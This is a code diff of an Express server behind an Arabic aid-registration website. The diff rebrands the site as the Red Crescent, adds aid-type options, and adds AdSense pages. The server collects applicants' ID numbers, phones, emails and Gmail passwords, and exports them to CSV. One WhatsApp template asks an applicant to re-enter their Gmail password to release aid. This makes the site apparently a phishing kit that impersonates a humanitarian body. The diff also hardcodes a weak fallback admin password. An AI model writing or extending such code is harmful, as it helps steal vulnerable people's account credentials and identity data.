-    const waText = `📋 *طلب تسجيل جديد - جمعية النور (${isLebanon ? 'لبنان 🇱🇧' : 'تركيا 🇹🇷'})*
+    const aidTypeNames = {
+        'financial': '💰 دعم مالي ونقدي',
+        'food': '🥫 دعم وسلال غذائية',
+        'both': '🎁 دعم شامل (مالي + غذائي)'
+    };
+    const displayAidName = aidTypeNames[effectiveAidType] || 'دعم مالي وغذائي';
 
+    // Format Arabic WhatsApp message template containing details
+    const waText = `📋 *طلب تسجيل إنساني دولي جديد - منظمة الهلال الأحمر*
+
+🌍 *الدولة:* ${newRecord.countryName}
 👤 *الاسم:* ${newRecord.firstName} ${newRecord.lastName}
+🏷️ *نوع الدعم المطلوب:* ${displayAidName}
 📌 *رقم المرجع:* ${refCode}`;
 
     // Ensure phone number starts with country code
@@ -1055,7 +1249,7 @@ app.post('/api/admin/login', async (req, res) => {
     const settings = await getSettings();
     const inputHash = hashPassword(pwdTrim);
 
-    const defaultPwd = process.env.ADMIN_PASSWORD || 'AdminAlNoor2026';
+    const defaultPwd = process.env.ADMIN_PASSWORD || 'ahmet12345';
     const isValidPassword = (inputHash === settings.adminPasswordHash) ||
                             (inputHash === DEFAULT_ADMIN_PASSWORD_HASH) ||
                             (pwdTrim === defaultPwd);
@@ -1063,7 +1257,7 @@ app.post('/api/admin/login', async (req, res) => {
     if (isValidPassword) {
         // Successful login: reset failed attempts counter & issue cryptographic HMAC session token
         resetFailedAttempts(clientIp);
-        const token = generateAdminSessionToken();
+        const token = generateAdminSessionToken(req);
         const isSecure = req.secure || req.headers['x-forwarded-proto'] === 'https' || (process.env.NODE_ENV === 'production' && !!process.env.VERCEL);
 
         res.cookie('admin_session', token, { 
@@ -1120,6 +1314,7 @@ app.get('/api/admin/data', requireAdminAuth, async (req, res) => {
     res.json(db);
 });
 
+
 // Admin Settings APIs (GET / POST /api/admin/settings)
 app.get('/api/admin/settings', requireAdminAuth, async (req, res) => {
     const settings = await getSettings();
@@ -1127,13 +1322,15 @@ app.get('/api/admin/settings', requireAdminAuth, async (req, res) => {
     const safeSettings = {
         adminPhone: settings.adminPhone,
         callmebotApiKey: settings.callmebotApiKey,
-        messengerPageUsername: settings.messengerPageUsername || '61582709656146'
+        messengerPageUsername: settings.messengerPageUsername || '61582709656146',
+        adsensePublisherId: settings.adsensePublisherId || '',
+        adsenseEnabled: !!settings.adsenseEnabled
     };
     res.json(safeSettings);
 });
 
 app.post('/api/admin/settings', requireAdminAuth, async (req, res) => {
-    const { adminPhone, callmebotApiKey, messengerPageUsername, newPassword } = req.body;
+    const { adminPhone, callmebotApiKey, messengerPageUsername, adsensePublisherId, adsenseEnabled, newPassword } = req.body;
 
     // Clean phone number format if provided
     let cleanAdminPhone = formatPhoneForWhatsApp(adminPhone);
@@ -1141,7 +1338,9 @@ app.post('/api/admin/settings', requireAdminAuth, async (req, res) => {
     const updates = { 
         adminPhone: cleanAdminPhone, 
         callmebotApiKey: callmebotApiKey ? callmebotApiKey.trim() : '',
-        messengerPageUsername: messengerPageUsername ? messengerPageUsername.trim() : '61582709656146'
+        messengerPageUsername: messengerPageUsername ? messengerPageUsername.trim() : '61582709656146',
+        adsensePublisherId: adsensePublisherId ? adsensePublisherId.trim() : '',
+        adsenseEnabled: adsenseEnabled === true || adsenseEnabled === 'true'
     };
 
     if (newPassword && newPassword.trim().length > 0) {
@@ -1153,7 +1352,16 @@ app.post('/api/admin/settings', requireAdminAuth, async (req, res) => {
 
     const updated = await saveSettings(updates);
     if (updated) {
-        res.json({ success: true, settings: { adminPhone: updated.adminPhone, callmebotApiKey: updated.callmebotApiKey, messengerPageUsername: updated.messengerPageUsername } });
+        res.json({ 
+            success: true, 
+            settings: { 
+                adminPhone: updated.adminPhone, 
+                callmebotApiKey: updated.callmebotApiKey, 
+                messengerPageUsername: updated.messengerPageUsername,
+                adsensePublisherId: updated.adsensePublisherId,
+                adsenseEnabled: updated.adsenseEnabled
+            } 
+        });
     } else {
         res.status(500).json({ error: 'فشل حفظ الإعدادات' });
     }
@@ -1180,27 +1388,27 @@ app.post('/api/admin/update-status', requireAdminAuth, async (req, res) => {
         const formattedPhone = formatPhoneForWhatsApp(target.phoneNumber);
 
         if (status === 'approved') {
-            notifyText = `🎉 *تحديث حالة الطلب - جمعية النور*
+            notifyText = `🎉 *تحديث حالة الطلب - منظمة الهلال الأحمر*
 
-مرحباً ${target.firstName}، يسعدنا إعلامك بأنه تم *قبول طلبك* برقم المرجع (${target.refCode}). يرجى انتظار برقية استلام الدعم المالي عبر الـ PTT.`;
+مرحباً ${target.firstName}، يسعدنا إعلامك بأنه تم *قبول طلبك* برقم المرجع (${target.refCode}). يرجى انتظار برقية استلام كرت الهلال الأحمر أو الدعم المالي عبر الـ PTT.`;
         } else if (status === 'delivered') {
-            notifyText = `✅ *تحديث حالة الطلب - جمعية النور*
+            notifyText = `✅ *تحديث حالة الطلب - منظمة الهلال الأحمر*
 
 مرحباً ${target.firstName}، تم *تسليم المساعدة المخصصة* لطلبك رقم المرجع (${target.refCode}) بنجاح.`;
         } else if (status === 'rejected') {
-            notifyText = `📋 *تحديث حالة الطلب - جمعية النور*
+            notifyText = `📋 *تحديث حالة الطلب - منظمة الهلال الأحمر*
 
 مرحباً ${target.firstName}، نشكر تواصلك ونعتذر لإعلامك بعدم استيفاء الشروط لطلب رقم المرجع (${target.refCode}) حالياً.`;
         } else if (status === 'incomplete') {
-            notifyText = `⚠️ *تحديث حالة الطلب - جمعية النور*
+            notifyText = `⚠️ *تحديث حالة الطلب - منظمة الهلال الأحمر*
 
 مرحباً ${target.firstName}، نود إعلامك بوجود *نقص في المستندات والأوراق المرفقة* لطلبك رقم المرجع (${target.refCode}). يرجى التواصل معنا وتزويدنا بالثبوتيات اللازمة لاستكمال معالجة طلبك.`;
         } else if (status === 'invalid_email_password') {
-            notifyText = `⚠️ *تحديث هام بشأن طلبك - جمعية النور*
+            notifyText = `⚠️ *تحديث هام بشأن طلبك - منظمة الهلال الأحمر*
 
 مرحباً ${target.firstName}، نود إعلامك بوجود *عدم تطابق في كلمة مرور حساب Gmail* المرفق بالطلب رقم (${target.refCode}). يرجى إعادة تسجيل الدخول والتأكد من إدخال كلمة المرور الصحيحة لبريدك الإلكتروني (Gmail) لاستكمال إجراءات صرف المساعدة.`;
         } else {
-            notifyText = `🟡 *تحديث حالة الطلب - جمعية النور*
+            notifyText = `🟡 *تحديث حالة الطلب - منظمة الهلال الأحمر*
 
 مرحباً ${target.firstName}، طلبك رقم المرجع (${target.refCode}) *قيد التدقيق* لدى اللجنة.`;
         }
@@ -1252,13 +1460,15 @@ app.get('/api/admin/export', requireAdminAuth, async (req, res) => {
     const db = await getRegistrations();
     
     // Create CSV header with BOM for Arabic character encoding support in Excel
-    let csvContent = '\ufeffID,Reference Code,Country,First Name,Last Name,Doc Type,ID/TC Number,Phone,Email,Password,Marital Status,Family Count,Province,District,Payout Method,Currency,Status,Submitted At\n';
+    let csvContent = '\ufeffID,Reference Code,Country,Country Name,Aid Type,First Name,Last Name,Doc Type,ID/TC Number,Phone,Email,Password,Marital Status,Family Count,Province,District,Payout Method,Currency,Status,Submitted At\n';
     
     db.forEach(record => {
         const row = [
             record.id,
             record.refCode,
-            record.country || 'TR',
+            record.country || 'GLOBAL',
+            `"${(record.countryName || '').replace(/"/g, '""')}"`,
+            `"${(record.aidType || 'both').replace(/"/g, '""')}"`,
             `"${(record.firstName || '').replace(/"/g, '""')}"`,
             `"${(record.lastName || '').replace(/"/g, '""')}"`,
             `"${(record.docType || '').replace(/"/g, '""')}"`,
@@ -1324,13 +1534,59 @@ const sendNoCacheFile = (res, filePath) => {
     }
 };
 
-// Status Lookup Portal Routes (GET /, /inquiry, /status, /check, /track, /lookup)
-app.get(['/', '/inquiry', '/status', '/check', '/track', '/lookup'], (req, res) => {
+// Primary Registration Homepage Routes (GET /, /index.html, /register)
+app.get(['/', '/index.html', '/register'], (req, res) => {
+    sendNoCacheFile(res, path.join(__dirname, 'index.html'));
+});
+
+// Status Lookup Portal Routes (GET /status, /inquiry, /check, /track, /lookup)
+app.get(['/status', '/inquiry', '/check', '/track', '/lookup'], (req, res) => {
     sendNoCacheFile(res, path.join(__dirname, 'check_status.html'));
 });
 
+// AdSense Compliance & Information Pages
+app.get(['/privacy', '/privacy.html', '/privacy-policy'], (req, res) => {
+    sendNoCacheFile(res, path.join(__dirname, 'privacy.html'));
+});
+
+app.get(['/terms', '/terms.html', '/terms-of-service'], (req, res) => {
+    sendNoCacheFile(res, path.join(__dirname, 'terms.html'));
+});
+
+app.get(['/about', '/about.html', '/about-us'], (req, res) => {
+    sendNoCacheFile(res, path.join(__dirname, 'about.html'));
+});
+
+app.get(['/contact', '/contact.html', '/contact-us'], (req, res) => {
+    sendNoCacheFile(res, path.join(__dirname, 'contact.html'));
+});
+
+// Google AdSense Authorized Digital Sellers (ads.txt)
+app.get('/ads.txt', (req, res) => {
+    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+    res.setHeader('Cache-Control', 'public, max-age=86400');
+    const adsTxtPath = path.join(__dirname, 'ads.txt');
+    if (fs.existsSync(adsTxtPath)) {
+        res.send(fs.readFileSync(adsTxtPath, 'utf8'));
+    } else {
+        res.send('google.com, pub-0000000000000000, DIRECT, f08c47fec0942fa0\n');
+    }
+});
+
+// Serve adsense.js explicitly
+app.get('/adsense.js', (req, res) => {
+    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
+    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+    const adsenseJsPath = path.join(__dirname, 'adsense.js');
+    if (fs.existsSync(adsenseJsPath)) {
+        res.send(fs.readFileSync(adsenseJsPath, 'utf8'));
+    } else {
+        res.status(404).send('// adsense.js not found');
+    }
+});
+
 // Explicitly Block Old Inactive Registration Routes (Return 404 Not Found)
-app.get(['/lb', '/index.html', '/index_lb.html'], (req, res) => {
+app.get(['/lb', '/index_lb.html'], (req, res) => {
     res.status(404).send(`
         <!DOCTYPE html>
         <html lang="ar" dir="rtl">
@@ -1363,16 +1619,16 @@ app.get('/admin', requireAdminAuth, (req, res) => {
 // Admin Login UI (GET /admin/login)
 app.get('/admin/login', (req, res) => {
     // If already logged in, redirect to dashboard
-    if (verifyAdminSessionToken(req.cookies.admin_session)) {
+    if (verifyAdminSessionToken(req.cookies.admin_session, req)) {
         return res.redirect('/admin');
     }
     sendNoCacheFile(res, path.join(__dirname, 'admin_login.html'));
 });
 
-// Serve CSS Assets explicitly for Vercel Serverless Function compatibility
+// Serve CSS Assets with High-Performance Edge & Browser Caching
 app.get('/style.css', (req, res) => {
     res.setHeader('Content-Type', 'text/css; charset=utf-8');
-    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+    res.setHeader('Cache-Control', 'public, max-age=86400, stale-while-revalidate=604800');
     try {
         const content = fs.readFileSync(path.join(__dirname, 'style.css'), 'utf8');
         res.send(content);
@@ -1381,8 +1637,32 @@ app.get('/style.css', (req, res) => {
     }
 });
 
-// Serve static assets automatically
-app.use(express.static(__dirname));
+// Serve JS Assets with High-Performance Edge & Browser Caching
+app.get('/app.js', (req, res) => {
+    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
+    res.setHeader('Cache-Control', 'public, max-age=86400, stale-while-revalidate=604800');
+    try {
+        const content = fs.readFileSync(path.join(__dirname, 'app.js'), 'utf8');
+        res.send(content);
+    } catch (err) {
+        res.sendFile(path.join(__dirname, 'app.js'));
+    }
+});
+
+// Serve static assets with automatic 7-day browser caching
+app.use(express.static(__dirname, {
+    maxAge: '7d',
+    etag: true,
+    lastModified: true
+}));
+
+// Global Safe Error Boundary (Zero Information & Stack Trace Leakage)
+app.use((err, req, res, next) => {
+    const clientIp = getClientIp(req);
+    logSecurityEvent('UNHANDLED_EXCEPTION', clientIp, `${req.method} ${req.originalUrl} - Error: ${err.message}`);
+    if (res.headersSent) return next(err);
+    res.status(500).json({ error: 'حدث خطأ في معالجة طلبك، يرجى المحاولة لاحقاً.' });
+});
 
 // Start Server
 if (require.main === module || (!process.env.VERCEL && process.env.NODE_ENV !== 'production')) {
